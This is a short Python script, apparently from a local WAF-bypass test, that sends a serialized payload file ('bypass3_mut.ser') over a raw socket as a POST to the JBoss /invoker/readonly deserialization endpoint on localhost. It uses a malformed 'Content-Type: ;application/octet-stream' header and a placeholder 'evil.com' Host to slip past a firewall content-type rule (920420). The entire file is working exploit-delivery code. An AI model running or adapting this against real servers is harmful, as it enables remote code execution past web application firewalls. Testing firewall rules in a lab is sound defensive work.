# -*- coding: utf-8 -*-
"""920420 移除态探针：分号 CT。"""
import socket

data = open("bypass3_mut.ser", "rb").read()
s = socket.create_connection(("127.0.0.1", 18380), timeout=25)
hdr = ("POST /invoker/readonly HTTP/1.1\r\nHost: evil.com\r\n"
       "Content-Type: ;application/octet-stream\r\n"
       "Content-Length: %d\r\nConnection: close\r\n\r\n" % len(data))
s.sendall(hdr.encode("latin-1") + data)
resp = b""
while True:
    try:
        c = s.recv(65536)
    except socket.timeout:
        break
    if not c:
        break
    resp += c
s.close()
print("semi-CT ->", resp.split(b"\r\n", 1)[0].decode(errors="replace")[:44])
